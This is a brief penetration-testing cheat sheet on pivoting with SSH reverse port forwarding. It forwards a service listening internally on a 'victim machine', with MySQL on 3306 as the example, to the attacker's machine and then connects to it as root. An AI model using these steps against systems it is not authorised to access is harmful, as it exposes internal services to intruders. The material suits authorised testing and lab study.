# Port Forwarding - SSH

To forward a port open internally in the victim machine to our local machine.

## **Usage**

```bash
ssh -R <local-port>:127.0.0.1:<service-port> <username>@<local-machine>
```

## **Find the open ports**

```bash
netstat -nl
```

## **Example MySQL**

```bash
ssh -R 4444:127.0.0.1:3306 root@10.10.10.x
```

## **In the local machine access the port**

```bash
mysql -u root -h 127.0.0.1 -P 4444
```